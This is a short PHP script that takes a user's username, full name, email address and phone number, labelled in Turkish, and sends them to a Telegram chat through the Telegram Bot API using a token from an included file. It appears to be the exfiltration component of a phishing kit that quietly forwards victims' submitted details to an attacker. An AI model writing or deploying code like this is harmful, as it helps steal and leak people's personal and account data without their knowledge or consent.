<?php
include 'tokenandchatid.php';
    $data = [
        'text' => ' 
Kullanıcı Adı: '.$blind.' 

İsim ve Soyisim : '.$nam.'
Mail adress : '.$email.'
Tel : '.$phone.'

      ',
  'chat_id' => $chat_id
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>